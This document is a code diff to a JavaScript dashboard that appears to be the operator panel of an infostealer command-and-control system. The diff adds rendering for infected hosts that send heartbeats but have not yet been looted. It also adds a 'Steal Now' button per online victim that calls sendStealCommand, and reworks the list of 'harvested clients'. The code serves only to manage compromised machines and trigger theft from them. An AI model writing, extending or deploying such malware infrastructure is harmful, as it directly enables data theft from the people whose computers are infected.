@@ -748,6 +748,39 @@ async function loadDashboardStats() {
 }
 
 // 2. Clients Horizontal list
+function renderC2OnlyRow(client, isOnline) {
+    const row = document.createElement('div');
+    row.className = 'client-row';
+    const statusClass = isOnline ? 'status-online' : 'status-offline';
+    const statusText = isOnline ? 'Online' : 'Offline';
+    const parts = client.client_id.split('_');
+    const hostname = parts[0] || client.hostname || '';
+    const username = parts.slice(1).join('_') || client.username || '';
+    const hbDate = client.last_heartbeat ? formatDate(client.last_heartbeat) : '';
+
+    row.innerHTML = `
+        <div class="client-checkbox"></div>
+        <div class="client-status-pill ${statusClass}">
+            <span class="status-dot"></span>
+            <span class="status-text">${statusText}</span>
+        </div>
+        <div class="client-info-user">
+            <strong>${escapeHtml(username)}</strong>
+            <span>@${escapeHtml(hostname)}</span>
+        </div>
+        <div class="client-info-ip">${client.ip || ''}</div>
+        <div class="client-info-os"><span>Awaiting steal</span></div>
+        <div class="client-info-files"><span>—</span></div>
+        <div class="client-info-date">${hbDate}</div>
+        <div class="client-info-actions">
+            ${isOnline ? `<button class="btn-icon btn-icon-success" onclick="sendStealCommand('${escapeHtml(client.client_id)}')" title="Steal Now">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+            </button>` : ''}
+        </div>
+    `;
+    return row;
+}
+
 function renderClientRow(log, isOnline) {
     const row = document.createElement('div');
     row.className = 'client-row';
@@ -836,24 +869,39 @@ async function loadClients() {
             if (now - hb < 60000) onlineSet.add(c.client_id);
         });
 
-        if (!data.logs || data.logs.length === 0) {
-            container.innerHTML = `<div class="empty-state py-8">No harvested clients found.</div>`;
-            document.getElementById('prev-page-btn').disabled = true;
-            document.getElementById('next-page-btn').disabled = true;
-            return;
-        }
-
         container.innerHTML = '';
-        data.logs.forEach(log => {
-            const clientId = log.hostname + '_' + log.username;
-            const isOnline = onlineSet.has(clientId);
-            container.appendChild(renderClientRow(log, isOnline));
+
+        // Show C2-only clients (online but no log yet)
+        const loggedClientIds = new Set();
+        if (data.logs) {
+            data.logs.forEach(log => loggedClientIds.add(log.hostname + '_' + log.username));
+        }
+        c2Clients.forEach(c => {
+            const cid = c.client_id;
+            if (!loggedClientIds.has(cid)) {
+                const hb = new Date(c.last_heartbeat + 'Z').getTime();
+                const isOnline = (now - hb < 60000);
+                container.appendChild(renderC2OnlyRow(c, isOnline));
+            }
         });
 
-        document.getElementById('current-page').innerText = data.page;
-        document.getElementById('total-pages').innerText = data.totalPages;
-        document.getElementById('prev-page-btn').disabled = data.page <= 1;
-        document.getElementById('next-page-btn').disabled = data.page >= data.totalPages;
+        // Show logged clients
+        if (data.logs) {
+            data.logs.forEach(log => {
+                const clientId = log.hostname + '_' + log.username;
+                const isOnline = onlineSet.has(clientId);
+                container.appendChild(renderClientRow(log, isOnline));
+            });
+        }
+
+        if (container.children.length === 0) {
+            container.innerHTML = `<div class="empty-state py-8">No clients found.</div>`;
+        }
+
+        document.getElementById('current-page').innerText = data.page || 1;
+        document.getElementById('total-pages').innerText = data.totalPages || 1;
+        document.getElementById('prev-page-btn').disabled = !data.page || data.page <= 1;
+        document.getElementById('next-page-btn').disabled = !data.page || data.page >= data.totalPages;
 
     } catch (err) {
         console.error('Error loading clients:', err);
